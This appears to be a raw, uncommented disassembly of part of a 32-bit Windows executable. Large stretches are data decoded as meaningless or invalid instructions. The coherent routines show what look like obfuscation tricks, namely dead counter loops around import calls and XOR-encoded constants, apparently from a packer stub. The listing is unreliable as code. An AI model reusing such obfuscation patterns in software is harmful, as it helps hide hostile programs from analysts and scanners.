  40e228:	jo     0x40e22e
  40e22a:	mov    bl,0x49
  40e22c:	adc    DWORD PTR [esi+0x6e08deb9],esi
  40e232:	xchg   edx,eax
  40e233:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e234:	mov    bl,0x9c
  40e236:	shl    BYTE PTR [eax],1
  40e238:	push   ss
  40e239:	sbb    edx,ecx
  40e23b:	pop    ebx
  40e23c:	adc    cl,BYTE PTR [ecx-0x2fb71e95]
  40e242:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e243:	cwde   
  40e244:	sub    esi,DWORD PTR [esi]
  40e246:	or     DWORD PTR [esi-0x21],esp
  40e249:	retf   0x2d0d
  40e24c:	pop    ds
  40e24d:	mov    ah,0x4d
  40e24f:	fsub   QWORD PTR [esi-0x34]
  40e252:	add    eax,DWORD PTR [esi-0x4d338ec4]
  40e258:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e259:	or     bl,bl
  40e25b:	jo     0x40e23f
  40e25d:	dec    ebx
  40e25e:	cmp    ecx,DWORD PTR [esi-0x42ac58a]
  40e264:	and    DWORD PTR [esi+0x3e],0xffffffb6
  40e268:	imul   esi,DWORD PTR [edi+ecx*8],0x5e06e3f4
  40e26f:	retf   
  40e270:	rol    BYTE PTR [ebp+0x27],cl
  40e273:	imul   eax,ecx,0x63dd03e7
  40e279:	sar    BYTE PTR [esp+eax*4-0x50],0xd3
  40e27e:	rcr    ebp,1
  40e280:	dec    esp
  40e281:	(bad)  
  40e282:	stc    
  40e283:	push   ss
  40e284:	shl    edx,1
  40e286:	fwait
  40e287:	imul   ebp,ecx,0xffffffa6
  40e28a:	ror    BYTE PTR [ebp-0x52],0xd2
  40e28e:	xor    dh,BYTE PTR [ecx+0x2ef3938b]
  40e294:	sub    al,0x3d
  40e297:	jne    0x40e225
  40e299:	jo     0x40e2b9
  40e29b:	repnz repnz push ebx
  40e29e:	add    edx,DWORD PTR [edx+0x11]
  40e2a1:	mov    ebp,0xbf737aa6
  40e2a6:	daa    
  40e2a7:	xchg   esi,eax
  40e2a8:	pop    eax
  40e2a9:	scas   al,BYTE PTR es:[edi]
  40e2aa:	xor    esp,edi
  40e2ac:	push   edi
  40e2ad:	fild   WORD PTR ds:0x82ba8035
  40e2b3:	jo     0x40e2c5
  40e2b5:	xor    al,0x8a
  40e2b7:	stos   BYTE PTR es:[edi],al
  40e2b8:	popf   
  40e2b9:	shr    ch,1
  40e2bb:	mov    bl,0x42
  40e2bd:	sub    ch,bh
  40e2bf:	dec    esi
  40e2c1:	xchg   ebp,eax
  40e2c2:	aam    0xc
  40e2c4:	jbe    0x40e2fb
  40e2c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2c7:	sub    esi,DWORD PTR [edx-0x7a23d084]
  40e2cd:	add    DWORD PTR [esi+0x14],ebx
  40e2d0:	sub    al,0x73
  40e2d2:	xor    ch,dl
  40e2d4:	jl     0x40e2cf
  40e2d6:	adc    bh,dh
  40e2d8:	jle    0x40e27b
  40e2da:	dec    esp
  40e2db:	data16 loope 0x40e31d
  40e2de:	jbe    0x40e2e4
  40e2e0:	jmp    0x40e32f
  40e2e2:	xchg   ebx,eax
  40e2e3:	lods   eax,DWORD PTR ds:[esi]
  40e2e4:	dec    edx
  40e2e5:	xchg   bh,cl
  40e2e7:	adc    ebx,ebx
  40e2e9:	jg     0x40e34a
  40e2eb:	mov    edx,0xbc2c67df
  40e2f0:	and    cl,dh
  40e2f2:	mov    edx,0x30245fcb
  40e2f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e2f8:	cmp    BYTE PTR [edi],bl
  40e2fa:	std    
  40e2fb:	shl    BYTE PTR [ebx-0x4a],cl
  40e2fe:	fist   DWORD PTR [edx+0x6a8e2b15]
  40e304:	xor    BYTE PTR [eax-0x2d],dh
  40e307:	and    al,0x14
  40e309:	push   ebx
  40e30a:	outs   dx,DWORD PTR ds:[esi]
  40e30b:	dec    DWORD PTR ds:0xb2c41536
  40e311:	pusha  
  40e312:	sahf   
  40e313:	jg     0x40e331
  40e315:	fisub  DWORD PTR [ebx+0x7ec9e1bc]
  40e31b:	adc    DWORD PTR [ebx-0x7a],0xffffff96
  40e31f:	int    0x24
  40e321:	push   0x1dcbf464
  40e326:	aaa    
  40e327:	add    eax,0x7057be41
  40e32c:	js     0x40e34b
  40e32e:	cwde   
  40e32f:	test   DWORD PTR [esi],edi
  40e331:	xor    BYTE PTR [edx+0x1d2334b],bh
  40e337:	pop    ebp
  40e338:	hlt    
  40e339:	pop    ebx
  40e33a:	mov    eax,DWORD PTR [ebp-0xc]
  40e33d:	pop    edi
  40e33e:	pop    esi
  40e33f:	pop    ebx
  40e340:	leave  
  40e341:	ret    0x10
  40e344:	push   ebp
  40e345:	mov    ebp,esp
  40e347:	push   ecx
  40e348:	mov    DWORD PTR ds:0x433617,0x77e5
  40e352:	push   ecx
  40e353:	mov    DWORD PTR ds:0x433727,0xd96
  40e35d:	mov    eax,0xf89c8532
  40e362:	mov    DWORD PTR ds:0x4336eb,0x6f59
  40e36c:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40e373:	push   esi
  40e374:	movzx  ecx,WORD PTR ds:0x43366b
  40e37b:	mov    DWORD PTR [ebp-0x8],eax
  40e37e:	mov    ecx,DWORD PTR [ebp+0x8]
  40e381:	mov    DWORD PTR ds:0x4336bb,0x659
  40e38b:	push   edi
  40e38c:	mov    edi,0x7510854
  40e391:	not    esi
  40e393:	mov    esi,0x32729b
  40e398:	mov    DWORD PTR ds:0x433667,0x4cec
  40e3a2:	cmp    ecx,eax
  40e3a4:	mov    DWORD PTR ds:0x4336af,0x27d6
  40e3ae:	jmp    0x40e4db
  40e3b3:	cs jecxz 0x40e357
  40e3b6:	add    eax,0xf1aa4571
  40e3bb:	push   0x47
  40e3bd:	popf   
  40e3be:	(bad)  
  40e3bf:	fld    QWORD PTR [edi+0x6e]
  40e3c2:	out    dx,eax
  40e3c3:	aas    
  40e3c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3c5:	jle    0x40e445
  40e3c7:	push   cs
  40e3c8:	jg     0x40e448
  40e3ca:	jle    0x40e417
  40e3cc:	adc    dl,BYTE PTR [eax+edx*2+0x33]
  40e3d0:	add    ebx,edx
  40e3d2:	sbb    al,0x4c
  40e3d4:	repz fdivr DWORD PTR [edi]
  40e3d8:	lds    ebp,FWORD PTR [ebp+0x31]
  40e3db:	jae    0x40e3cb
  40e3dd:	sti    
  40e3de:	cmp    DWORD PTR [edx+ebx*4],ecx
  40e3e1:	dec    esi
  40e3e2:	(bad)  
  40e3e4:	loop   0x40e44c
  40e3e6:	dec    eax
  40e3e7:	imul   esp,ebp,0xfed64116
  40e3ed:	pop    ebp
  40e3ee:	cwde   
  40e3ef:	into   
  40e3f0:	mov    dh,0x92
  40e3f2:	fwait
  40e3f3:	jb     0x40e428
  40e3f5:	(bad)  
  40e3f6:	push   DWORD PTR [ebx+eax*4+0x42]
  40e3fa:	xchg   esp,eax
  40e3fb:	push   esi
  40e3fc:	aas    
  40e3fd:	pop    eax
  40e3fe:	mov    eax,ds:0x296e5ffe
  40e403:	aam    0xf2
  40e405:	lods   eax,DWORD PTR ds:[esi]
  40e406:	mov    al,0xec
  40e408:	pop    esi
  40e409:	push   edx
  40e40a:	cs xchg edi,eax
  40e40c:	xchg   esi,eax
  40e40d:	sti    
  40e40e:	enter  0x5a6b,0x9a
  40e412:	cli    
  40e413:	(bad)  
  40e414:	xor    al,0xcc
  40e416:	sub    DWORD PTR ds:0xe80b6686,ecx
  40e41c:	mov    edx,0x815aa43b
  40e421:	scas   al,BYTE PTR es:[edi]
  40e422:	lock jle 0x40e450
  40e425:	or     al,0x3b
  40e427:	fdiv   QWORD PTR [edi]
  40e429:	aad    0xc0
  40e42b:	pop    esi
  40e42c:	je     0x40e41b
  40e42e:	xchg   ebp,eax
  40e42f:	sub    al,BYTE PTR [ebx]
  40e431:	ins    DWORD PTR es:[edi],dx
  40e432:	in     al,dx
  40e433:	push   edi
  40e434:	mov    bh,cl
  40e436:	mov    ds:0x3a4d45db,al
  40e43b:	(bad)  
  40e43c:	repz pop eax
  40e43e:	or     ecx,DWORD PTR [edi+0x7]
  40e441:	pop    es
  40e442:	loope  0x40e44b
  40e444:	xchg   ax,ax
  40e446:	mov    edi,0x2e47b9e9
  40e44b:	test   al,0xe8
  40e44d:	sar    edx,1
  40e44f:	sub    DWORD PTR [ebx],eax
  40e451:	mov    cl,0xd5
  40e453:	jne    0x40e47a
  40e455:	add    al,0xf4
  40e457:	ss stos DWORD PTR es:[edi],eax
  40e459:	das    
  40e45a:	les    ebx,FWORD PTR [ecx]
  40e45c:	push   edi
  40e45d:	xor    al,0x56
  40e45f:	inc    ecx
  40e460:	xchg   edx,eax
  40e461:	sbb    al,BYTE PTR [edi-0xf]
  40e464:	and    dh,cl
  40e466:	lds    esp,FWORD PTR [edx-0x6e]
  40e469:	pop    edx
  40e46a:	jge    0x40e41e
  40e46c:	test   DWORD PTR [ecx],eax
  40e46e:	scas   eax,DWORD PTR es:[edi]
  40e46f:	lds    esp,FWORD PTR [bp+si-0x2058]
  40e474:	cdq    
  40e475:	sbb    al,0xdd
  40e477:	mov    ds:0x1508111d,eax
  40e47c:	in     eax,0xd5
  40e47e:	jg     0x40e480
  40e480:	sbb    al,0xb3
  40e482:	fwait
  40e483:	out    0x5f,al
  40e485:	mov    ebp,0xd710e5e9
  40e48a:	inc    edi
  40e48b:	(bad)  
  40e48c:	push   0xc3513603
  40e491:	jmp    0x40e4f7
  40e493:	inc    edi
  40e494:	push   ebp
  40e495:	mov    dh,0x6e
  40e497:	shr    DWORD PTR [edx],0x4
  40e49a:	cmc    
  40e49b:	shr    DWORD PTR [edi-0x6bab3273],0xa4
  40e4a2:	push   edx
  40e4a3:	mov    al,ds:0x86a2796d
  40e4a8:	adc    esp,edx
  40e4aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4ab:	sbb    al,0xab
  40e4ad:	jmp    0x5637:0x1735c750
  40e4b4:	fild   DWORD PTR [edx+0x52ead04d]
  40e4ba:	popf   
  40e4bb:	adc    DWORD PTR [edx+0x6c120241],eax
  40e4c1:	rol    DWORD PTR [ecx],0x8
  40e4c4:	pop    eax
  40e4c5:	adc    eax,0x338f3631
  40e4ca:	pusha  
  40e4cb:	xchg   ebp,eax
  40e4cc:	push   es
  40e4cd:	outs   dx,BYTE PTR ds:[esi]
  40e4ce:	cmc    
  40e4cf:	inc    edi
  40e4d0:	ret    0x390f
  40e4d3:	jle    0x40e52a
  40e4d5:	sub    DWORD PTR [edx],ebp
  40e4d7:	sub    ch,cl
  40e4d9:	push   eax
  40e4da:	sbb    BYTE PTR [edi],cl
  40e4dc:	test   dl,bh
  40e4de:	add    DWORD PTR [eax],eax
  40e4e0:	add    BYTE PTR [ecx+0x43373305],al
  40e4e6:	add    BYTE PTR [ebp-0x74ffffce],bh
  40e4ec:	inc    ebp
  40e4ed:	cld    
  40e4ee:	mov    ecx,DWORD PTR [ebp+0xc]
  40e4f1:	xor    DWORD PTR ds:0x433617,0x4336bf
  40e4fb:	xor    eax,edi
  40e4fd:	add    eax,esi
  40e4ff:	cmp    eax,ecx
  40e501:	mov    DWORD PTR ds:0x433733,0x147f
  40e50b:	je     0x40e6db
  40e511:	and    DWORD PTR ds:0x4336a7,0x0
  40e51b:	jmp    0x40e52b
  40e520:	mov    eax,ds:0x4336a7
  40e525:	inc    eax
  40e526:	mov    ds:0x4336a7,eax
  40e52b:	cmp    DWORD PTR ds:0x4336a7,0x13
  40e532:	jae    0x40e568
  40e538:	cmp    DWORD PTR ds:0x4336a7,0x9
  40e53f:	jne    0x40e54b
  40e545:	call   DWORD PTR ds:0x412030
  40e54b:	cmp    DWORD PTR ds:0x4336a7,0x8
  40e552:	jne    0x40e563
  40e558:	mov    eax,ds:0x4336a7
  40e55d:	inc    eax
  40e55e:	mov    ds:0x4336a7,eax
  40e563:	jmp    0x40e520
  40e568:	mov    eax,DWORD PTR [ebp-0x4]
  40e56b:	sub    edx,DWORD PTR ds:0x4336bb
  40e571:	xor    eax,edi
  40e573:	dec    edx
  40e574:	add    eax,esi
  40e576:	push   eax
  40e577:	adc    DWORD PTR ds:0x4336b3,0x52cc
  40e581:	push   DWORD PTR [ebp-0x8]
  40e584:	or     DWORD PTR ds:0x43367b,edx
  40e58a:	push   DWORD PTR [ebp-0x4]
  40e58d:	mov    edx,DWORD PTR ds:0x413bde
  40e593:	call   0x406864
  40e598:	mov    ecx,DWORD PTR ds:0x413bde
  40e59e:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40e5a4:	mov    DWORD PTR [ecx],eax
  40e5a6:	mov    eax,DWORD PTR [ebp-0x8]
  40e5a9:	jmp    0x40e840
  40e5ae:	jmp    0x40e6db
  40e5b3:	xor    dl,BYTE PTR [ebp-0x2e]
  40e5b6:	fs jno 0x40e61a
  40e5b9:	mov    al,0x51
  40e5bb:	sti    
  40e5bc:	adc    eax,0x98889328
  40e5c1:	loope  0x40e548
  40e5c3:	iret   
  40e5c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5c5:	jle    0x40e645
  40e5c7:	push   cs
  40e5c8:	jg     0x40e648
  40e5ca:	jle    0x40e5e6
  40e5cc:	jecxz  0x40e63e
  40e5ce:	(bad)  
  40e5cf:	adc    eax,0x268753d3
  40e5d4:	je     0x40e5e7
  40e5d6:	jle    0x40e5a4
  40e5d8:	fadd   st,st(1)
  40e5da:	sub    dl,BYTE PTR [ebx]
  40e5dc:	daa    
  40e5dd:	outs   dx,DWORD PTR ds:[esi]
  40e5de:	inc    ebx
  40e5df:	lods   eax,DWORD PTR ds:[esi]
  40e5e0:	pop    edx
  40e5e1:	jne    0x40e5e9
  40e5e3:	xchg   esi,eax
  40e5e4:	outs   dx,BYTE PTR ds:[esi]
  40e5e5:	loope  0x40e602
  40e5e7:	inc    eax
  40e5e8:	dec    ebp
  40e5e9:	and    al,0xef
  40e5eb:	or     al,ch
  40e5ed:	mov    eax,edx
  40e5ef:	and    BYTE PTR [ebp-0x6706ede9],ch
  40e5f5:	xchg   DWORD PTR [eax+ebp*1],ebx
  40e5f8:	cmp    eax,0xa8c7a2ce
  40e5fd:	call   0xa3dcaf7e
  40e602:	(bad)  
  40e603:	fldenv [edi+0x30]
  40e606:	mov    dl,0xa4
  40e608:	loop   0x40e5dd
  40e60a:	push   cs
  40e60b:	mov    ebx,0xdf36a65c
  40e610:	add    BYTE PTR [edx-0x28],al
  40e613:	test   BYTE PTR [eax],dl
  40e615:	add    DWORD PTR [edi-0xa],0x55
  40e619:	cli    
  40e61a:	mov    esi,0x4b056775
  40e61f:	xchg   DWORD PTR [eax+edx*8-0x49e5f039],edx
  40e626:	or     BYTE PTR [esi*1+0x32b45492],ch
  40e62d:	inc    edx
  40e62e:	retf   0xc4fc
  40e631:	sub    al,bl
  40e633:	sub    al,0xa
  40e635:	les    edx,FWORD PTR [ecx]
  40e637:	enter  0xc8ac,0xa7
  40e63b:	shr    esp,0xaa
  40e63e:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e640:	shl    ebp,cl
  40e642:	adc    DWORD PTR [eax],esi
  40e644:	pop    ecx
  40e645:	push   ecx
  40e646:	fsub   QWORD PTR [ecx]
  40e648:	(bad)  
  40e649:	dec    esi
  40e64a:	test   al,0xe0
  40e64c:	ret    0x7083
  40e64f:	stos   DWORD PTR es:[edi],eax
  40e650:	call   0xb2195677
  40e655:	ins    DWORD PTR es:[edi],dx
  40e656:	cmp    BYTE PTR [edx],ah
  40e658:	fsubr  QWORD PTR [ebp+0x6ab926e1]
  40e65e:	test   BYTE PTR [ebp+eax*4-0x78ae6f90],bh
  40e665:	cmp    ebp,DWORD PTR [edi+ecx*8-0x20ba5acb]
  40e66c:	inc    esi
  40e66d:	xor    eax,0x139ce4b7
  40e672:	stos   BYTE PTR es:[edi],al
  40e673:	daa    
  40e674:	lea    ebp,[ebp+0x2d06e4e2]
  40e67a:	sub    eax,0xad9f4e43
  40e67f:	dec    edi
  40e680:	sub    ecx,DWORD PTR [edi]
  40e682:	popa   
  40e683:	aam    0x9c
  40e685:	ja     0x40e657
  40e687:	rcr    DWORD PTR [ebp-0x1910786c],1
  40e68d:	inc    ebp
  40e68e:	push   ecx
  40e68f:	adc    al,al
  40e691:	mov    ds:0x37c27ab5,al
  40e696:	ret    
  40e697:	push   ebx
  40e698:	scas   eax,DWORD PTR es:[edi]
  40e699:	sub    al,0x95
  40e69b:	stc    
  40e69c:	rcr    DWORD PTR [esi],cl
  40e69e:	sbb    ebx,DWORD PTR ds:0xaaf4f562
  40e6a4:	push   ecx
  40e6a5:	mov    ds,esp
  40e6a7:	test   eax,0x58565804
  40e6ac:	cmp    dl,BYTE PTR [ebx+edx*4]
  40e6af:	mov    eax,0xbc01fd47
  40e6b4:	xchg   ebp,eax
  40e6b5:	or     al,ch
  40e6b7:	xor    DWORD PTR [edi-0x18],edi
  40e6ba:	leave  
  40e6bb:	mov    eax,0xf1a0d24c
  40e6c0:	pop    ds
  40e6c1:	repz hlt 
  40e6c3:	mov    ebx,DWORD PTR [esi+0x27e4b0e7]
  40e6c9:	out    dx,eax
  40e6ca:	push   edi
  40e6cb:	mov    dl,0xa0
  40e6cd:	or     DWORD PTR [edx-0x4e],esi
  40e6d0:	popa   
  40e6d1:	jge    0x40e6de
  40e6d3:	xchg   ecx,eax
  40e6d4:	test   BYTE PTR [edx],0xe4
  40e6d7:	fld    TBYTE PTR [edx+ebx*2]
  40e6da:	in     eax,0x8b
  40e6dc:	inc    ebp
  40e6dd:	cld    
  40e6de:	mov    ecx,DWORD PTR [ebp+0x10]
  40e6e1:	xor    eax,edi
  40e6e3:	add    eax,esi
  40e6e5:	cmp    eax,ecx
  40e6e7:	jne    0x40e83d
  40e6ed:	mov    eax,DWORD PTR [ebp-0x4]
  40e6f0:	xor    eax,edi
  40e6f2:	add    eax,esi
  40e6f4:	jmp    0x40e821
  40e6f9:	xor    BYTE PTR [ebx+0x7369636a],al
  40e6ff:	xor    DWORD PTR [ecx+0x23],edx
  40e702:	mov    ebp,0x9c1830a1
  40e707:	bound  esi,QWORD PTR [esi+0x7e7ea2df]
  40e70d:	push   cs
  40e70e:	jg     0x40e78e
  40e710:	jle    0x40e6f9
  40e712:	and    eax,DWORD PTR [edi+0x46]
  40e715:	mov    eax,0x9582c32b
  40e71a:	push   ecx
  40e71b:	adc    ch,BYTE PTR [edx+0x28bec1ee]
  40e721:	cmc    
  40e722:	mov    ds:0x61ca612d,al
  40e727:	lods   al,BYTE PTR ds:[esi]
  40e728:	sub    ebx,ebx
  40e72a:	mov    al,ds:0x9446726f
  40e72f:	mov    ds:0x714b15bd,eax
  40e734:	fsub   QWORD PTR [eax+edx*8+0xd6cc81b]
  40e73b:	inc    eax
  40e73c:	push   ss
  40e73d:	int3   
  40e73e:	sub    eax,DWORD PTR [edi-0x627fc09]
  40e744:	das    
  40e745:	adc    BYTE PTR [ebx+eax*8-0x2e64d5b3],ch
  40e74c:	mov    bh,0xdc
  40e74e:	push   0x907a7cae
  40e753:	rcl    BYTE PTR [edi],0x20
  40e756:	cs (bad) 
  40e759:	mov    dl,0x5f
  40e75b:	lods   al,BYTE PTR ds:[esi]
  40e75c:	outs   dx,DWORD PTR ds:[esi]
  40e75d:	cmp    BYTE PTR [esi],0x9c
  40e760:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e761:	and    al,0xe3
  40e763:	fsubr  DWORD PTR [bx+si+0x4a12]
  40e768:	mov    ds:0x997b58ba,eax
  40e76d:	sub    eax,0xf2498323
  40e772:	icebp  
  40e773:	or     eax,0x165a0dcc
  40e778:	mov    ebp,0x1895bfdb
  40e77d:	stos   DWORD PTR es:[edi],eax
  40e77e:	daa    
  40e77f:	xchg   ecx,eax
  40e780:	js     0x40e735
  40e782:	jbe    0x40e792
  40e784:	das    
  40e785:	push   ebx
  40e786:	retf   0xac6b
  40e789:	imul   esp,DWORD PTR [eax],0xffffff89
  40e78c:	ds ins DWORD PTR es:[edi],dx
  40e78e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e78f:	xor    eax,0x49547d20
  40e794:	add    BYTE PTR [edi-0x31],bh
  40e797:	xchg   BYTE PTR [ecx+edi*1],dl
  40e79a:	sti    
  40e79b:	xchg   DWORD PTR [eax],ebx
  40e79d:	imul   ebp,DWORD PTR [ebx],0xffffffa5
  40e7a0:	aaa    
  40e7a1:	xlat   BYTE PTR ds:[ebx]
  40e7a2:	mov    edx,0x55ab246d
  40e7a7:	sbb    DWORD PTR [ebx],0x14
  40e7aa:	sub    eax,0xf8ef0a12
  40e7af:	rcl    BYTE PTR [ebx+0x42],0xd0
  40e7b3:	xor    dl,dl
  40e7b5:	xchg   edx,eax
  40e7b6:	pop    ebx
  40e7b7:	mov    gs,WORD PTR [edx+0x4cb5bc71]
  40e7bd:	jnp    0x40e7f8
  40e7bf:	pop    es
  40e7c0:	bound  ebx,QWORD PTR [ebp+0x3b]
  40e7c3:	lods   al,BYTE PTR ds:[esi]
  40e7c4:	push   ebp
  40e7c5:	test   DWORD PTR [ebx+0x5d],edx
  40e7c8:	daa    
  40e7c9:	add    BYTE PTR [esi+0x5a],bh
  40e7cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7cd:	stos   DWORD PTR es:[edi],eax
  40e7ce:	mov    ch,0x8a
  40e7d0:	xor    eax,0xc93a6a77
  40e7d5:	aad    0x73
  40e7d7:	sbb    BYTE PTR [ecx+esi*1+0x66],ch
  40e7db:	or     BYTE PTR ds:0x2c2080b4,0x7a
  40e7e2:	push   eax
  40e7e3:	lea    ebx,ds:0x141affab
  40e7e9:	std    
  40e7ea:	jg     0x40e78d
  40e7ec:	mov    DWORD PTR [esp+edx*2],ebx
  40e7ef:	inc    edi
  40e7f0:	add    al,0x5c
  40e7f2:	(bad)  
  40e7f3:	daa    
  40e7f4:	xchg   ebp,eax
  40e7f5:	js     0x40e86a
  40e7f7:	in     al,0xc6
  40e7f9:	sti    
  40e7fa:	pop    es
  40e7fb:	leave  
  40e7fc:	loope  0x40e7d4
  40e7fe:	loop   0x40e7c6
  40e800:	in     al,0xe0
  40e802:	pop    edi
  40e803:	out    dx,eax
  40e804:	xor    dh,BYTE PTR [eax+0x719b66ae]
  40e80a:	mov    esp,0xcb7fb8fb
  40e80f:	shr    dh,1
  40e811:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e812:	mov    al,0xfd
  40e814:	xchg   edi,eax
  40e815:	jp     0x40e7a4
  40e817:	inc    ebx
  40e818:	cmp    cl,BYTE PTR [edx-0x75]
  40e81b:	(bad)  
  40e81c:	mov    ds:0x96227526,al
  40e821:	mov    ds:0x413c62,eax
  40e826:	mov    eax,DWORD PTR [ebp-0x4]
  40e829:	xor    eax,edi
  40e82b:	add    eax,esi
  40e82d:	mov    ds:0x413c5a,eax
  40e832:	push   DWORD PTR [ebp-0x8]
  40e835:	push   DWORD PTR [ebp-0x4]
  40e838:	call   0x40e84a
  40e83d:	mov    eax,DWORD PTR [ebp-0x4]
  40e840:	xor    eax,edi
  40e842:	pop    edi
  40e843:	add    eax,esi
  40e845:	pop    esi
  40e846:	leave  
  40e847:	ret    0xc
  40e84a:	push   ebp
  40e84b:	mov    ebp,esp
  40e84d:	sub    esp,0x60
  40e850:	mov    eax,DWORD PTR [ebp+0x8]
  40e853:	push   ebx
  40e854:	and    DWORD PTR ds:0x43373f,0x0
  40e85e:	jmp    0x40e870
  40e863:	mov    ebx,DWORD PTR ds:0x43373f
  40e869:	inc    ebx
  40e86a:	mov    DWORD PTR ds:0x43373f,ebx
  40e870:	cmp    DWORD PTR ds:0x43373f,0x19
  40e877:	jae    0x40e8a2
  40e87d:	cmp    DWORD PTR ds:0x43373f,0x1e
  40e884:	jne    0x40e893
  40e88a:	push   DWORD PTR [ebp-0x14]
  40e88d:	call   DWORD PTR ds:0x412034
  40e893:	jmp    0x40e863
  40e898:	sub    DWORD PTR ds:0x4336bf,0x283f
  40e8a2:	push   esi
  40e8a3:	and    DWORD PTR ds:0x4336ff,0x0
  40e8ad:	mov    esi,DWORD PTR ds:0x4336ff
  40e8b3:	inc    esi
  40e8b4:	mov    DWORD PTR ds:0x4336ff,esi
  40e8ba:	cmp    DWORD PTR ds:0x4336ff,0x10
  40e8c1:	jne    0x40e8d5
  40e8c7:	push   0x43367f
  40e8cc:	push   DWORD PTR [ebp-0x28]
  40e8cf:	call   DWORD PTR ds:0x4123ac
  40e8d5:	cmp    DWORD PTR ds:0x4336ff,0xf
  40e8dc:	jne    0x40e8ef
  40e8e2:	mov    esi,DWORD PTR ds:0x4336ff
  40e8e8:	inc    esi
  40e8e9:	mov    DWORD PTR ds:0x4336ff,esi
  40e8ef:	cmp    DWORD PTR ds:0x4336ff,0x1a
  40e8f6:	jb     0x40e8ad
  40e8fc:	mov    DWORD PTR ds:0x4336f7,0x1e
  40e906:	cmp    DWORD PTR ds:0x4336f7,0x0
  40e90d:	je     0x40e960
  40e913:	cmp    DWORD PTR ds:0x4336f7,0xc
  40e91a:	jne    0x40e933
  40e920:	push   0x6d58
  40e925:	push   DWORD PTR [ebp-0x20]
  40e928:	push   0x30b0
  40e92d:	call   DWORD PTR ds:0x4121e0
  40e933:	cmp    DWORD PTR ds:0x4336f7,0xd
  40e93a:	jne    0x40e94d
  40e940:	mov    ebx,DWORD PTR ds:0x4336f7
  40e946:	dec    ebx
  40e947:	mov    DWORD PTR ds:0x4336f7,ebx
  40e94d:	mov    ebx,DWORD PTR ds:0x4336f7
  40e953:	dec    ebx
  40e954:	mov    DWORD PTR ds:0x4336f7,ebx
  40e95a:	jmp    0x40e906
  40e95f:	dec    esi
  40e960:	mov    esi,0x7510854
  40e965:	xor    eax,esi
  40e967:	mov    ebx,0x32729b
  40e96c:	add    eax,ebx
  40e96e:	and    DWORD PTR ds:0x4336a7,0x3e06
  40e978:	push   edi
  40e979:	neg    DWORD PTR ds:0x43362b
  40e97f:	mov    DWORD PTR [ebp-0x18],eax
  40e982:	and    DWORD PTR ds:0x43361b,0x0
  40e98c:	mov    edi,DWORD PTR ds:0x43361b
  40e992:	inc    edi
  40e993:	mov    DWORD PTR ds:0x43361b,edi
  40e999:	cmp    DWORD PTR ds:0x43361b,0x21
  40e9a0:	jne    0x40e9b4
  40e9a6:	push   DWORD PTR [ebp-0x1c]
  40e9a9:	push   0x4336bb
  40e9ae:	call   DWORD PTR ds:0x4121e4
  40e9b4:	cmp    DWORD PTR ds:0x43361b,0x12
  40e9bb:	jb     0x40e98c
  40e9c1:	sbb    DWORD PTR ds:0x43361b,edx
  40e9c7:	mov    edi,DWORD PTR [ebp+0x8]
  40e9ca:	xor    edi,esi
  40e9cc:	and    DWORD PTR ds:0x43366b,0x43360f
  40e9d6:	mov    DWORD PTR [ebp-0xc],0xf89c85f1
  40e9dd:	adc    DWORD PTR ds:0x433737,0x4336bf
  40e9e7:	mov    DWORD PTR [ebp-0x10],0xf89c8731
  40e9ee:	sub    DWORD PTR ds:0x43367f,0x4336bb
  40e9f8:	add    edi,ebx
  40e9fa:	mov    DWORD PTR ds:0x4336ab,0x5e0d
  40ea04:	jmp    0x40f1b9
  40ea09:	cmp    edi,0x40
  40ea0c:	jne    0x40ec91
  40ea12:	movzx  eax,BYTE PTR ds:0x43361f
  40ea19:	mov    eax,ds:0x413a5e
  40ea1e:	jmp    0x40ec4b
  40ea23:	xchg   BYTE PTR [edi],dh
  40ea25:	inc    ebx
  40ea26:	(bad)  
  40ea27:	jae    0x40ea94
  40ea29:	push   edx
  40ea2a:	aaa    
  40ea2b:	mov    ds:0xb3103a68,al
  40ea30:	hlt    
  40ea31:	cwde   
  40ea32:	adc    eax,0x7e7ea3ef
  40ea37:	push   cs
  40ea38:	jl     0x40eab8
  40ea3a:	jle    0x40e9de
  40ea3c:	ja     0x40ea99
  40ea3e:	out    dx,eax
  40ea3f:	inc    eax
  40ea40:	inc    eax
  40ea41:	push   0x708cf146
  40ea46:	jae    0x40e9f6
  40ea48:	mov    edx,0x1ac848c7
  40ea4d:	in     eax,dx
  40ea4e:	fld    TBYTE PTR [ebp+0x212b9c52]
  40ea54:	xor    al,0xb7
  40ea56:	(bad)  
  40ea57:	sbb    esi,DWORD PTR [edx+0x188dd73c]
  40ea5d:	pusha  
  40ea5e:	adc    ebx,DWORD PTR [ecx-0x3f]
  40ea61:	mov    al,0xfc
  40ea63:	cdq    
  40ea64:	mov    edi,0x954f1707
  40ea69:	imul   edx,eax,0x2b
  40ea6c:	mov    ebx,0x3d8f3431
  40ea71:	outs   dx,BYTE PTR ds:[esi]
  40ea72:	pop    eax
  40ea73:	test   DWORD PTR [ebx+0x6db0358a],edi
  40ea79:	ret    
  40ea7a:	jae    0x40ea23
  40ea7c:	dec    edx
  40ea7d:	std    
  40ea7e:	mov    ebx,eax
  40ea80:	pop    esi
  40ea81:	stos   BYTE PTR es:[edi],al
  40ea82:	cmp    bh,BYTE PTR [eax+0x30]
  40ea85:	mov    bl,BYTE PTR [ecx+0x46]
  40ea88:	je     0x40ea7c
  40ea8a:	adc    al,0x4a
  40ea8c:	lds    ecx,FWORD PTR [edi-0x24]
  40ea8f:	repz das 
  40ea91:	jbe    0x40ea9b
  40ea93:	adc    esp,DWORD PTR [ebp+0x4edbf642]
  40ea99:	jo     0x40ea4a
  40ea9b:	cmp    BYTE PTR [ebx],ch
  40ea9d:	and    al,0x6
  40ea9f:	scas   eax,DWORD PTR es:[edi]
  40eaa0:	inc    esp
  40eaa1:	pop    ecx
